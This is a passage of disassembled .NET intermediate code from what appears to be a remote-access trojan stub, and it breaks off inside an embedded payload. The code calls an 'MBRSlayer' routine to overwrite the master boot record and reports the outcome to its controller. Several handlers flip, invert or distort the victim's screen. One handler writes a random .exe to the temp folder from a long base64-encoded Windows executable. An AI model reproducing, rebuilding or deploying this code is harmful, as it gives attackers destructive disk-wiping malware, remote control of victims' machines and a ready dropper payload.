        IL_06fd:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0702:  call       bool j.OK::Send(string)
        IL_0707:  pop
        IL_0708:  call       void Stub.MBRSlayer::Start()
        IL_070d:  ldstr      "C://test.txt"
        IL_0712:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0717:  leave      IL_0e38

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_071c:  dup
        IL_071d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0722:  stloc.s    V_10
        IL_0724:  ldloc.s    V_10
        IL_0726:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_072b:  ldstr      "denied"
        IL_0730:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0735:  brfalse.s  IL_0751

        IL_0737:  ldstr      "MSG"
        IL_073c:  ldsfld     string j.OK::Y
        IL_0741:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_0746:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_074b:  call       bool j.OK::Send(string)
        IL_0750:  pop
        IL_0751:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0756:  leave      IL_0e38

      }  // end handler
      IL_075b:  call       native int j.OK::GetDesktopWindow()
      IL_0760:  call       native int j.OK::GetWindowDC(native int)
      IL_0765:  stloc.s    V_11
      IL_0767:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_076c:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0771:  stloc.s    V_14
      IL_0773:  ldloca.s   V_14
      IL_0775:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_077a:  stloc.s    V_12
      IL_077c:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0781:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0786:  stloc.s    V_14
      IL_0788:  ldloca.s   V_14
      IL_078a:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_078f:  stloc.s    V_13
      IL_0791:  ldloc.s    V_11
      IL_0793:  ldc.i4.0
      IL_0794:  ldloc.s    V_13
      IL_0796:  ldloc.s    V_12
      IL_0798:  ldc.i4.0
      IL_0799:  ldloc.s    V_13
      IL_079b:  sub.ovf
      IL_079c:  ldloc.s    V_11
      IL_079e:  ldc.i4.0
      IL_079f:  ldc.i4.0
      IL_07a0:  ldloc.s    V_12
      IL_07a2:  ldloc.s    V_13
      IL_07a4:  ldc.i4     0xcc0020
      IL_07a9:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_07ae:  pop
      IL_07af:  br         IL_0e38

      IL_07b4:  call       native int j.OK::GetDesktopWindow()
      IL_07b9:  call       native int j.OK::GetWindowDC(native int)
      IL_07be:  stloc.s    V_15
      IL_07c0:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_07c5:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_07ca:  stloc.s    V_14
      IL_07cc:  ldloca.s   V_14
      IL_07ce:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_07d3:  stloc.s    V_16
      IL_07d5:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_07da:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_07df:  stloc.s    V_14
      IL_07e1:  ldloca.s   V_14
      IL_07e3:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_07e8:  stloc.s    V_17
      IL_07ea:  ldloc.s    V_15
      IL_07ec:  ldloc.s    V_16
      IL_07ee:  ldc.i4.0
      IL_07ef:  ldc.i4.0
      IL_07f0:  ldloc.s    V_16
      IL_07f2:  sub.ovf
      IL_07f3:  ldloc.s    V_17
      IL_07f5:  ldloc.s    V_15
      IL_07f7:  ldc.i4.0
      IL_07f8:  ldc.i4.0
      IL_07f9:  ldloc.s    V_16
      IL_07fb:  ldloc.s    V_17
      IL_07fd:  ldc.i4     0xcc0020
      IL_0802:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0807:  pop
      IL_0808:  br         IL_0e38

      IL_080d:  call       native int j.OK::GetDesktopWindow()
      IL_0812:  call       native int j.OK::GetWindowDC(native int)
      IL_0817:  stloc.s    V_18
      IL_0819:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_081e:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0823:  stloc.s    V_14
      IL_0825:  ldloca.s   V_14
      IL_0827:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_082c:  stloc.s    V_19
      IL_082e:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0833:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0838:  stloc.s    V_14
      IL_083a:  ldloca.s   V_14
      IL_083c:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0841:  stloc.s    V_20
      IL_0843:  ldloc.s    V_18
      IL_0845:  ldc.i4.0
      IL_0846:  ldc.i4.0
      IL_0847:  ldloc.s    V_19
      IL_0849:  ldloc.s    V_20
      IL_084b:  ldloc.s    V_18
      IL_084d:  ldc.i4.0
      IL_084e:  ldc.i4.0
      IL_084f:  ldloc.s    V_19
      IL_0851:  ldloc.s    V_20
      IL_0853:  ldc.i4     0x330008
      IL_0858:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_085d:  pop
      IL_085e:  br         IL_0e38

      IL_0863:  call       native int j.OK::GetDesktopWindow()
      IL_0868:  call       native int j.OK::GetWindowDC(native int)
      IL_086d:  stloc.s    V_21
      IL_086f:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0874:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0879:  stloc.s    V_14
      IL_087b:  ldloca.s   V_14
      IL_087d:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0882:  stloc.s    V_22
      IL_0884:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0889:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_088e:  stloc.s    V_14
      IL_0890:  ldloca.s   V_14
      IL_0892:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0897:  stloc.s    V_23
      IL_0899:  ldloc.s    V_21
      IL_089b:  ldc.i4.0
      IL_089c:  ldc.i4.0
      IL_089d:  ldloc.s    V_22
      IL_089f:  ldloc.s    V_23
      IL_08a1:  ldloc.s    V_21
      IL_08a3:  ldc.i4.0
      IL_08a4:  ldc.i4.0
      IL_08a5:  ldloc.s    V_22
      IL_08a7:  ldloc.s    V_23
      IL_08a9:  ldc.i4     0xff0062
      IL_08ae:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_08b3:  pop
      IL_08b4:  br         IL_0e38

      IL_08b9:  call       native int j.OK::GetDesktopWindow()
      IL_08be:  call       native int j.OK::GetWindowDC(native int)
      IL_08c3:  stloc.s    V_24
      IL_08c5:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_08ca:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_08cf:  stloc.s    V_14
      IL_08d1:  ldloca.s   V_14
      IL_08d3:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_08d8:  stloc.s    V_25
      IL_08da:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_08df:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_08e4:  stloc.s    V_14
      IL_08e6:  ldloca.s   V_14
      IL_08e8:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_08ed:  stloc.s    V_26
      IL_08ef:  ldloc.s    V_24
      IL_08f1:  ldc.i4.0
      IL_08f2:  ldc.i4.0
      IL_08f3:  ldloc.s    V_25
      IL_08f5:  ldloc.s    V_26
      IL_08f7:  ldloc.s    V_24
      IL_08f9:  ldc.i4.0
      IL_08fa:  ldc.i4.0
      IL_08fb:  ldloc.s    V_25
      IL_08fd:  ldloc.s    V_26
      IL_08ff:  ldc.i4.s   66
      IL_0901:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0906:  pop
      IL_0907:  br         IL_0e38

      IL_090c:  call       native int j.OK::GetDesktopWindow()
      IL_0911:  call       native int j.OK::GetWindowDC(native int)
      IL_0916:  stloc.s    V_27
      IL_0918:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_091d:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0922:  stloc.s    V_14
      IL_0924:  ldloca.s   V_14
      IL_0926:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_092b:  stloc.s    V_28
      IL_092d:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0932:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0937:  stloc.s    V_14
      IL_0939:  ldloca.s   V_14
      IL_093b:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0940:  stloc.s    V_29
      IL_0942:  ldloc.s    V_27
      IL_0944:  ldc.i4.s   25
      IL_0946:  ldc.i4.s   25
      IL_0948:  ldloc.s    V_28
      IL_094a:  ldc.i4.s   50
      IL_094c:  sub.ovf
      IL_094d:  ldloc.s    V_29
      IL_094f:  ldc.i4.s   50
      IL_0951:  sub.ovf
      IL_0952:  ldloc.s    V_27
      IL_0954:  ldc.i4.0
      IL_0955:  ldc.i4.0
      IL_0956:  ldloc.s    V_28
      IL_0958:  ldloc.s    V_29
      IL_095a:  ldc.i4     0xcc0020
      IL_095f:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0964:  pop
      IL_0965:  br         IL_0e38

      IL_096a:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_096f:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_0974:  stloc.s    V_31
      IL_0976:  ldloca.s   V_31
      IL_0978:  constrained. [mscorlib]System.Guid
      IL_097e:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0983:  ldstr      "-"
      IL_0988:  ldstr      ""
      IL_098d:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0992:  ldstr      ".exe"
      IL_0997:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_099c:  pop
      .try
      {
        IL_099d:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_09a2:  ldstr      "select.dat"
        IL_09a7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_09ac:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_09b1:  brfalse.s  IL_09c7

        IL_09b3:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_09b8:  ldstr      "select.dat"
        IL_09bd:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_09c2:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_09c7:  leave.s    IL_09d5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_09c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_09d3:  leave.s    IL_09d5

      }  // end handler
      IL_09d5:  ldstr      "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"
      + "JCgDrBY0JDgB2BE4NBgA3BfEJBgCXBv8MBgBfBv8MDgCgDBINDgAvBpcNDgBHBmYBBgCoD/"
      + "EJDgCGDE4NDgDMBmYBBgAhBfEJBgD9AiUPEgARCuYOBgDSCpwKBgBBBPEJBgBKBb4NCgCOB"
      + "TIKBgC6Bf8MBgAPDN4NBgBYC4cKCgCSBHIKBgC1DvEJDgBlBZcNCgB3DI0JBgCPB74NEgBx"
      + "DOYOEgB/D+YOBgAhC/EJEgCGDuYOEgDZDuYOEgCaDuYOCgBRD/8MBgBMDPEJBgAWCvEJBgC"
      + "4BPEJBgAxEPEJBgDdCPEJEgBmCuYODgCvAk4NDgDCAk4NBgAXA/EJBgBhEZwKCgCdBHIKBg"
      + "A4D74NDgDRCZcNBgDwDDQIDgBEDE4NEgAsDOYOBgD4DPEJBgBmCXgNDgBRAZcNEgDbCeYOE"
      + "gAvC+YOCgCvDo0JCgBPA/8MBgDUCOQABgB4CPEJBgA7A+QACgBkC/8MCgCxA/8MBgBSEPEJ"
      + "BgDxAvEJCgB4DI0JFgDHAKsIEgDACeYOEgChAuYOFgCxDKsIFgAhCKsIEgBzA+YOEgDACuY"
      + "OEgACBeYODgDPDpcNBgDsCvEJBgDZDPEJCgBoEI0JBgAZC/EJAAAAAK8AAAAAAAEAAQAAAA"
      + "AAZApJEUUAAQABAAAAAACeDEkRVQABAAQAAAEQAK8PSRFhAAEABQAAAQAA9w3vDWEABgALA"
      + "AABEAB7DkkRlQAIAA4AAAEAAIIRSRFhAAsAEgABAAAAMgBOCXUACwATAAUBAAAFDwAAYQAY"
      + "ADAABQEAAEANAABhABoAOQAFAQAAAQAAAGEAGgBAAAMBAAAJAQAAyQAbAEIAAgEAAHwBAAD"
      + "NACkAQgAxALULawIxAIwLcwIxAKALewIRAOwLgwIxAM4LiwIRABsKkwIRAGYEmAIRAG0CnQ"
      + "IRAB8MoQIRAIsPpAIBAIsAoQJRgAwBpwJRgO4ApwJRgNwAqgJRgM0ArQJRgP4ArQIRAJEBs"
      + "AIRAL8AywABAGcPtAIBAEYAuQIBAG0AuQIBAIMAuQIBAKcAuQIRAOYBvgIGABwAwgIRALkH"
      + "8wEGBkkBrQJWgIYCxgJWgG4JxgJWgPkBxgJWgAcCxgJWgBIFxgJWgP0QxgJWgCsIxgJWgPc"
      + "HxgJWgLgAxgJWgEYExgJWgCUQxgJWgCYIxgJWgDYRxgJQIAAASAATAE8KygIBAGcgAAAAAA"
      + "YY4wwGAAIAjCAAAAAAxAIFCgYAAgCeIAAAAAAGGOMMBgACAKYgAAAAABEY6QzuAAIA2iAAA"
      + "AAAEwiRDNACAgDmIAAAAAATCFQK1QICAPIgAAAAABMIggzaAgIA/iAAAAAAEwj7Dt8CAgAK"
      + "IQAAAAATCDAN5AICABYhAAAAABMICwzpAgIASCEAAAAAEwhOBO8CAgBPIQAAAAATCFoE9QI"
      + "CAFchAAAAABEY6QzuAAMAfCEAAAAABhjjDAYAAwCEIQAAAAARAGoO/AIDAJwhAAAAABYI9w"
      + "8EAwUABCIAAAAAEwhdDgQDBQALIgAAAAAGGOMMBgAFAEQiAAAAABEY6QzuAAUAZCIAAAAAF"
      + "gD8CAkDBQDoIgAAAAABAMYBEAMIAAAAAACAABEg0BAYAwoAAAAAAIAAESDuEB4DDAD1IgAA"
      + "AADECtUO8gAOAA8jAAAAAAEAogEkAw4AFyMAAAAAAQB/CCwDEAAAAAAAgAAWICcRNAMSAAA"
      + "AAACAABEgchA8AxYAAAAAAIAAFiAHA0QDGgAsIwAAAAARAF4JSgMbAAAAAACAABYgFhFQAx"
      + "wAAAAAAIAAFiACEVkDIABcIwAAAAABAAkJJAMhAKwjAAAAAAEAFQkkAyMAQiQAAAAAAQAhC"
      + "SQDJQBRJAAAAAABAC0JJAMnAFwkAAAAAMQCsAQVACkAnCQAAAAAAQBeEAYAKgDsJQAAAABD"
      + "CzgAXgMqAPQlAAAgAEMLQwBkAyoANyYAAAAAQwtfAF4DKwBAJgAAIABDC2oAZAMrAIMmAAA"
      + "AAEMLdQBeAywAjCYAACAAQwuAAGQDLADPJgAAAABDC5kAXgMtANgmAAAgAEMLpABkAy0AHC"
      + "cAAAAAEQA2AWsDLgAgKAAAAAABACIBcwMvADUoAAAAAAYY4wwGADAAPSgAAAAAxgLIDrIBM"
      + "ABLKAAAAADGAosC+AAxAFMoAAAAAIMAPgR7AzEAXygAAAAAxgJ2CBIBMQBnKAAAAAAGCCQA"
      + "gAMxAIAoAAAAAAYILgCFAzEApSgAAAAAxgLIDrIBMgCzKAAAAADGAosC+AAzALsoAAAAAIM"
      + "APgR7AzMAxygAAAAAxgJ2CBIBMwDQKAAAAAARADYBawMzAPAoAAAAAAEAIgFzAzQA+SgAAA"
      + "AABhjjDAYANQABKQAAAAADCF0CdAA1AB4pAAAAAAYY4wwGADUAAAAAAAMABhjjDLAANQAAA"
      + "AAAAwBGA+UCiwM3AAAAAAADAEYD2wKYAzwAAAAAAAMARgPqAp8DPQAAAAEAug4AAAEA7AcA"
      + "AAEABAwAAAIAMggAAAEAlwIAAAIA6gkAAAMA4wkAAAEABAwAAAIAMggAAAEA9gMAAAIAAgQ"
      + "AAAEAIgIAAAIA+RAAAAEABAwAAAIAMggAAAEABAwAAAIAMggAAAEAUwkAAAIAlwIAAAMA6g"
      + "kAAAQA4wkAAAEA2QgAAAIAJwoAAAMAVQ4AAAQATAsAAAEA6QMAAAEAkgEAAAEAVwkAAAIAL"
      + "QoAAAMAJwIAAAQAlwEAAAEAUwkAAAEABAwAAAIAMggAAAEABAwAAAIAMggAAAEABAwAAAIA"
      + "MggAAAEABAwAAAIAMggAAAEAoQgAAAEAzQcAAAEAzQcAAAEAzQcAAAEAzQcAAAEAdAIAAAE"
      + "AfQIAAAEAeAsAAAEA5gcAAAEAeAsAAAEAfQIAAAEAfQIAAAEAog8AAAIALAIAAAEAlwIAAA"
      + "IA6gkAAAMA4wkAAAQA6wgAAAUAygQAAAEAPhAAAAEAlwIAAAIA6gkAAAMA4wkJAOMMAQARA"
      + "OMMBgAZAOMMCgApAOMMEAAxAOMMEAA5AOMMEABBAOMMEABJAOMMEABRAOMMEABZAOMMFQBh"
      + "AOMMEABpAOMMEABxAOMMGgCBAOMMIACRAOMMBgCZAOMMBgChAOMMBgCxAOMMBgC5AOMMBgD"
      + "RAOMMJgDZAOMMBgABAeMMBgAJAeMMEAARAeMMBgA5AeMMBgBJAeMMEACJAEUILgCxAQMQMg"
      + "CJADsLNwCJAOMMPQCJADkCFQCJAD4OFQCJAN4PFQCJAF0DRACJAPgJSwCpAOMMBgAMAOMMB"
      + "gAUAOMMBgAcAOMMBgAkAOMMBgAsAOMMBgAMAF0CdAAUAF0CdAAcAF0CdAAkAF0CdAAsAF0C"
      + "dADBAL8OeQD5ACkDfwD5AF0RhwAZAeMMjQDZARUClQDBAOMMBgDhAd0HngApAeMMBgCJAMU"
      + "PowApAfIHBgDpASIEqwDxAYsMqwD5AeMMsACJAD8LtgDxAfIPqwDpAOMMBgCJAeMMsADpAK"
